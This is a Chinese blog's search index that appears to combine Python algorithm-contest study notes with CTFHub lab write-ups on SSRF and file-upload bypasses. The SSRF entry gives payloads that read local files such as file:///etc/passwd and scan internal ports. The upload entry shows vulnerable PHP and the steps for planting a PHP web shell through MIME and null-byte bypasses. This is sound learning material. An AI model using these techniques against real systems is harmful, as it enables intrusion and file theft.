<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>蓝桥杯30天-chls学算法</title>
    <link href="/2025/03/12/%E8%93%9D%E6%A1%A5%E6%9D%AF30%E5%A4%A9-chls%E5%AD%A6%E7%AE%97%E6%B3%95/"/>
    <url>/2025/03/12/%E8%93%9D%E6%A1%A5%E6%9D%AF30%E5%A4%A9-chls%E5%AD%A6%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="一">3.12 一</h2><p>2暴力 + 2贪心</p><blockquote><p>总算没再摆烂，不过题目还是要问问豆包，才能理解，过几天重写一遍题目再试试</p></blockquote><h2 id="二">3.13 二</h2><p>6 简单</p><p><strong>贪心排序，其实就是排序</strong></p><p><ahref="https://leetcode.cn/problems/queue-reconstruction-by-height/description/">406.根据身高重建队列 - 力扣（LeetCode）</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">people = [[<span class="hljs-number">7</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">4</span>,<span class="hljs-number">4</span>],[<span class="hljs-number">7</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">5</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">6</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">5</span>,<span class="hljs-number">2</span>]]<br><br><span class="hljs-comment"># 先按子列表的第一个元素降序排序，当第一个元素相等时，再按第二个元素升序排序。</span><br><span class="hljs-comment"># 输出: [[7, 0], [7, 1], [6, 1], [5, 0], [5, 2], [4, 4]]</span><br>people.sort(key = <span class="hljs-keyword">lambda</span> x: (-x[<span class="hljs-number">0</span>], x[<span class="hljs-number">1</span>])) <br></code></pre></td></tr></table></figure><p><strong>贪心</strong>，但是我感觉就是排序，可能这俩就经常结合着用吧</p><p><ahref="https://leetcode.cn/problems/apple-redistribution-into-boxes/description/">3074.重新分装苹果 - 力扣（LeetCode）</a></p><p><strong>排序 + 贪心</strong></p><p><ahref="https://leetcode.cn/problems/maximum-bags-with-full-capacity-of-rocks/description/">2279.装满石头的背包的最大数量 - 力扣（LeetCode）</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># 算两数组对应位置之差</span><br>chak = [a - b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(capacity, rocks)]<br></code></pre></td></tr></table></figure><p>这玩意，力扣第一题吗，</p><p>可暴力</p><p>可<strong>哈希 + 前缀</strong></p><p><ahref="https://leetcode.cn/problems/two-sum/description/?envType=problem-list-v2&amp;envId=array">1.两数之和 - 力扣（LeetCode）</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">d = &#123;&#125; <span class="hljs-comment"># 字典</span><br>d[<span class="hljs-number">11</span>] = <span class="hljs-number">0</span> <span class="hljs-comment"># 就是 d = &#123;11: 0&#125;</span><br>d[<span class="hljs-number">7</span>] = <span class="hljs-number">1</span> <span class="hljs-comment"># 就是 d 变为 &#123;11: 0, 7: 1&#125;。</span><br></code></pre></td></tr></table></figure><p><strong>前缀和</strong></p><p><a href="https://www.luogu.com.cn/problem/P8218">P8218【深进1.例1】求区间和 - 洛谷</a></p><blockquote><p>洛谷的IDE感觉有点小麻烦</p><p>emmm，纯史来的</p></blockquote><p><strong>二分查找 &amp; bisect库</strong></p><p><a href="https://www.luogu.com.cn/problem/P2249">P2249【深基13.例1】查找 - 洛谷</a></p><p>这个题目：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> bisect <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-built_in">input</span> = <span class="hljs-keyword">lambda</span>: sys.stdin.readline().strip()<br>n, m = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>().split())<br>nums = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>().split()))<br>Q = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>().split()))<br><br>s = <span class="hljs-built_in">set</span>(nums) <span class="hljs-comment"># nums 构成的集合，如果待查询数组 q not in s，直接返回-1</span><br><span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> Q:<br>    <span class="hljs-keyword">if</span> q <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s: <br>        <span class="hljs-built_in">print</span>(-<span class="hljs-number">1</span>, end = <span class="hljs-string">&quot; &quot;</span>)<br>    <span class="hljs-keyword">else</span>: <span class="hljs-comment"># q 一定出现在 nums 中, 利用技巧将“大于等于 x”转化成“大于 x-1”</span><br>        <span class="hljs-built_in">print</span>(bisect(nums, q - <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>, end = <span class="hljs-string">&quot; &quot;</span>)<br>        <br>        <br><span class="hljs-comment"># 但是你要直接写：</span><br><span class="hljs-comment"># for q in Q:</span><br><span class="hljs-comment">#    if q not in nums:  </span><br><span class="hljs-comment">#          ……</span><br><span class="hljs-comment"># 就会报错，TLE，要先s = set(nums)，转换成集合</span><br><span class="hljs-comment"># 因为使用 if q not in nums: 来判断元素是否在列表 nums 中。列表的 in 操作符需要遍历整个列表，其时间复杂度为O(n)</span><br><span class="hljs-comment"># 而集合在 Python 中是基于哈希表实现的，其查找元素的时间复杂度为 O(1)（平均情况下）。这意味着无论集合的大小如何，查找元素所需的时间基本保持不变。</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>蓝桥杯，算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法刷题总结</title>
    <link href="/2025/03/05/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <url>/2025/03/05/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="快读">快读</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># 快读模板</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-built_in">input</span> = <span class="hljs-keyword">lambda</span>:sys.stdin.readline().strip()<br></code></pre></td></tr></table></figure><h2 id="输入">输入</h2><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202502211617100.png"alt="例1" /><figcaption aria-hidden="true">例1</figcaption></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">n = <span class="hljs-built_in">int</span>(<span class="hljs-selector-tag">input</span>()) <br><span class="hljs-selector-tag">a</span> = <span class="hljs-selector-attr">[int(x) for x in input().split()]</span>  <br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(*a)</span></span><br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>()) <br>nums = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>().split())) <br><br><span class="hljs-built_in">print</span>(*nums)<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202503081106748.png"alt="例2" /><figcaption aria-hidden="true">例2</figcaption></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">n, m = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>().split())<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202503121722987.png"alt="shuru" /><figcaption aria-hidden="true">shuru</figcaption></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-number">1204</span>)</span></span> 输出的是整数，int类型<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&#x27;1204&#x27;</span>)</span></span> 和 <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1204&quot;</span>)输出的是字符串，str类型<br></code></pre></td></tr></table></figure><h2 id="enumerate">enumerate</h2><p><code>enumerate</code> 函数基本用法：</p><p><code>enumerate</code> 函数的基本语法是<code>enumerate(iterable, start=0)</code>，其中：</p><ul><li><code>iterable</code>：是一个必需的参数，表示要进行枚举的可迭代对象，例如列表、元组、字符串等。</li><li><code>start</code>：是一个可选参数，用于指定索引的起始值，默认值为0。</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">people = [[<span class="hljs-number">6</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">5</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">4</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">3</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">2</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">4</span>]]<br><span class="hljs-keyword">for</span> i, p <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(people): <span class="hljs-comment"># enumerate 函数：用于同时获取列表的索引 i 和元素 p</span><br>    h, k = p[<span class="hljs-number">0</span>], p[<span class="hljs-number">1</span>]<br>    ……<br>   <br></code></pre></td></tr></table></figure><h2 id="res.appendres.insert">res.append，res.insert</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># 在列表末尾加上一个元素</span><br>res.append()<br><br><span class="hljs-comment"># 在下标为 3 的前面插入一个元素 99，Python列表的下标从0开始</span><br>res.insert(<span class="hljs-number">3</span>, <span class="hljs-number">99</span>)<br><br></code></pre></td></tr></table></figure><h2 id="排序">排序</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">len</span>.sort()  <span class="hljs-comment"># 默认从小到大</span><br><span class="hljs-built_in">len</span>.sort(reverse = <span class="hljs-literal">True</span>)  <span class="hljs-comment"># 从大到小</span><br><br></code></pre></td></tr></table></figure><h2 id="两个长度相同列表对应元素相减">两个长度相同列表对应元素相减</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">result = [a - b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(list1, list2)]<br></code></pre></td></tr></table></figure><h2 id="列表的排序">列表的排序</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py">nums = [<span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">6</span>]<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment"># nums 列表中的元素是整数，整数是不可索引的对象，不能使用 x[1] 这样的索引操作。</span><br>    <span class="hljs-comment"># x[1] 这种写法通常用于可迭代对象（如列表、元组等），它的意思是取可迭代对象中索引为 1 的元素。但整数并没有索引的概念，所以会引发 TypeError 异常。</span><br>    nums.sort(key = <span class="hljs-keyword">lambda</span> x : x[<span class="hljs-number">1</span>])<br><span class="hljs-keyword">except</span> TypeError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;出现错误: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># 这个想排序的话，直接：</span><br>nums.sort()  <span class="hljs-comment"># 从小到大 [1, 5, 6, 9]</span><br>nums.sort(reverse = <span class="hljs-literal">True</span>) <span class="hljs-comment"># 从大到小 [9, 6, 5, 1]</span><br><br></code></pre></td></tr></table></figure><p>如果 <code>nums</code> 是一个嵌套列表，<code>key</code>参数就可以发挥作用。例如：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">nums = [[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">3</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">4</span>]]<br><span class="hljs-comment"># 在这个例子中，nums 是一个嵌套列表，每个子列表有两个元素。</span><br><span class="hljs-comment"># key = lambda x : x[1] 表示按照每个子列表中索引为 1 的元素进行排序，即第二个元素，排序后：[[9, 1], [1, 2], [5, 3], [6, 4]]</span><br>nums.sort(key = <span class="hljs-keyword">lambda</span> x : x[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(nums)<br></code></pre></td></tr></table></figure><h2 id="钻牛角尖了">钻牛角尖了</h2><p><a href="https://www.luogu.com.cn/problem/P8218">P8218【深进1.例1】求区间和 - 洛谷</a></p><p>看一下下面两段代码，在刚开始我的理解中，一直觉得要写成第二个的类型，因为对于第一个，你输入一个，它就立马输出了呀，可是我们这里的m大于1，它不符合，就是下面这样：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202503131642196.png"alt="image-20250313164125423" /><figcaption aria-hidden="true">image-20250313164125423</figcaption></figure><p>但实际情况是，如果你直接复制粘贴过来，它也是对的</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202503131642256.png"alt="image-20250313164232188" /><figcaption aria-hidden="true">image-20250313164232188</figcaption></figure><p>我认为是要把它存入一个列表里面，最后一起输出，但是也不尽相同，豆包如是说：</p><blockquote><p>当你按下回车键确认输入后，程序会将输入的内容按照换行符或空格进行分割，然后依次读取每个查询的左右边界值，并根据前缀和数组计算并输出相应的区间和。</p><p>例如，你一次性输入<code>1 4</code>和<code>2 3</code>，中间以换行符分隔，程序会先读取<code>1 4</code>，计算并输出对应的区间和<code>10</code>，然后再读取<code>2 3</code>，计算并输出对应的区间和<code>5</code>。</p></blockquote><p>所以总结来说就是——都行！别钻牛角尖了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># 一</span><br>n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br>a = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>().split()))<br>m = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br><br>p = [<span class="hljs-number">0</span>] * (n + <span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    p[i + <span class="hljs-number">1</span>] = p[i] + a[i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>    l, r = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>().split())<br>    <span class="hljs-built_in">print</span>(p[r] - p[l - <span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># 二</span><br>n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br>a = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>().split()))<br>m = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br><br>p = [<span class="hljs-number">0</span>] * (n + <span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    p[i + <span class="hljs-number">1</span>] = p[i] + a[i]<br><br>res = [<span class="hljs-number">0</span>] * m<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>    l, r = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>().split())<br>    res[i] = p[r] - p[l - <span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span>(*res, sep = <span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>蓝桥杯，算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHub-技能树-SSRF</title>
    <link href="/2024/10/12/CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-SSRF/"/>
    <url>/2024/10/12/CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-SSRF/</url>
    
    <content type="html"><![CDATA[<blockquote><p>愿望：快乐每一天~</p></blockquote><p>SSRF，即服务器端请求伪造（Server-Side RequestForgery），是一种网络攻击技术，攻击者利用服务器上的应用程序向任意服务器发起请求或者操作，这些请求可能包括但不限于文件读取、命令执行、端口扫描等。由于这些请求是从服务器内部发起的，因此他们可以绕过服务器的外部访问控制，访问内部网络资源或者执行恶意操作。</p><p>一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统）。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202410121746747.png"alt="SSRF" /><figcaption aria-hidden="true">SSRF</figcaption></figure><blockquote><p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。</p></blockquote><h2 id="内网访问">内网访问</h2><blockquote><p>尝试访问位于127.0.0.1的flag.php吧</p></blockquote><p>打开页面，什么也没有，看到网址后面是<code>/?url=_</code></p><p>直接<code>/?url=127.0.0.1/flag.php</code>，得到flag</p><h2 id="伪协议读取文件">伪协议读取文件</h2><blockquote><p>尝试去读取一下Web目录下的flag.php吧</p></blockquote><p>常见的伪协议类型有</p><ul><li>file:///本地文件传输协议，主要用于访问本地计算机中的文件，如，file:///etc/passwd</li><li>dict://字典服务器协议，访问字典资源，如，dict:///ip:6739/info：</li><li>sftp:// SSH文件传输协议或安全文件传输协议</li><li>ldap:// 轻量级目录访问协议</li><li>tftp:// 简单文件传输协议</li><li>gopher:// 分布式文档传递服务，可使用gopherus生成payload</li></ul><p><strong>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</strong></p><p>本题我们直接访问</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/?url=file:/</span><span class="hljs-regexp">//</span>var<span class="hljs-regexp">/www/</span>html/flag.php   为什么这样呢var，www<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202410121813449.png"alt="var" /><figcaption aria-hidden="true">var</figcaption></figure><blockquote><p>反正反正就先这样吧，弟弟</p></blockquote><h2 id="端口扫描">端口扫描</h2><blockquote><p>来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦,</p></blockquote><p>根据题目提示，需要进行端口扫描。在SSRF中，dict协议与http协议可用来探测内网的主机存活与端口开放情况。</p><p>抓包后，发送到Intruder模块，将positions定位到内网地址端口，设置payload，然后开始攻击</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202410131201741.png"alt="payload设置" /><figcaption aria-hidden="true">payload设置</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202410131200491.png"alt="flag" /><figcaption aria-hidden="true">flag</figcaption></figure><p>攻击后的结果，按长度排序，看到了端口8140的我们的目标端口，这里直接就把flag显示出来力</p><h2 id="post请求">POST请求</h2><blockquote><p>参考：</p><p><ahref="https://blog.csdn.net/qq_43378996/article/details/124050308">SSRF漏洞原理攻击与防御(超详细总结)-CSDN博客</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF-Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHub-技能树-文件上传</title>
    <link href="/2024/05/22/CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2024/05/22/CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>文件上传的相关练习，这里写到MIME验证的时候才想起来写</p><p>所以MIME验证会写的较为详细</p></blockquote><h2 id="mime验证">MIME验证</h2><h3 id="知识点">1. 知识点</h3><p>　　MIME(（Multipurpose Internet MailExtensions）多用途互联网邮件扩展类型。</p><p>​它是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</p><p>​多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象 Image等,后面定义具体的种类。</p><p>常见的MME类型，例如：</p><ul><li>超文本标记语言文本 .html,html text/htm</li><li>普通文本 .txt text/plain</li><li>RTF文本. rtf application/rtf</li><li>GIF图形 .gif image/gif</li><li>JPEG图形 . jpg image/jpeg</li></ul><h3 id="题解">2. 题解</h3><p>这里我们直接传一个jpg文件</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405222052361.png"alt="直接传一个jpg文件" /><figcaption aria-hidden="true">直接传一个jpg文件</figcaption></figure><p>这样它的<code>Content-Type</code>就会是<code>image/jpeg</code></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405222047974.png"alt="传jpg文件" /><figcaption aria-hidden="true">传jpg文件</figcaption></figure><p>然后抓包改成php上传</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405222049264.png"alt="抓包改成php上传" /><figcaption aria-hidden="true">抓包改成php上传</figcaption></figure><p>蚁剑连接即可</p><p>注意这里连接的时候输入的是<code>http://challenge-76b3e352b9948d46.sandbox.ctfhub.com:10800/upload/mime.php</code>，因为你通过抓包已经把php给传上去了</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405222050337.png"alt="蚁剑连接" /><figcaption aria-hidden="true">蚁剑连接</figcaption></figure><p>然后找到flag文件： <imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405222051959.png"alt="找到flag文件" /></p><p>打开即可</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405222051717.png"alt="flag" /><figcaption aria-hidden="true">flag</figcaption></figure><h2 id="截断">00截断</h2><p>先认真了解一下什么是00截断：</p><p><ahref="http://www.admintony.com/关于上传中的00截断分析.html">关于上传中的00截断分析| AdminTony's Blog</a></p><p>然后就知道了，其实很简单的原理</p><p>先看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>    <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$name</span>);<br>    <span class="hljs-variable">$ext</span> = <span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;extension&#x27;</span>];<br>    <span class="hljs-variable">$whitelist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>, <span class="hljs-string">&quot;gif&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>        <span class="hljs-variable">$des</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;road&#x27;</span>] . <span class="hljs-string">&quot;/&quot;</span> . <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>) . <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>) . <span class="hljs-string">&quot;.&quot;</span> . <span class="hljs-variable">$ext</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$des</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件类型不匹配&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>还是白名单，只能传"jpg", "png","gif"，那跟上题一样，先构造一个jpg文件</p><p>然后抓包：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405222121887.png"alt="burp抓包" /><figcaption aria-hidden="true">burp抓包</figcaption></figure><p>改包：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405222122709.png"alt="改包" /><figcaption aria-hidden="true">改包</figcaption></figure><p>蚁剑连接即可：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202405222123989.png"alt="蚁剑" /><figcaption aria-hidden="true">蚁剑</figcaption></figure><blockquote><p>参考：</p><p><ahref="https://www.cnblogs.com/0yst3r-2046/p/12509072.html">CTFHub题解-技能树-Web-文件上传（无验证、前端验证）【一】- 0yst3r - 博客园 (cnblogs.com)</a></p><p><ahref="https://www.cnblogs.com/0yst3r-2046/p/12511617.html">CTFHub题解-技能树-Web-文件上传（.htaccess、MIME绕过、文件头检查）【二】- 0yst3r - 博客园 (cnblogs.com)</a></p><p><ahref="https://www.cnblogs.com/0yst3r-2046/p/12530316.html">CTFHub题解-技能树-Web-文件上传（00截断、双写后缀）【三】- 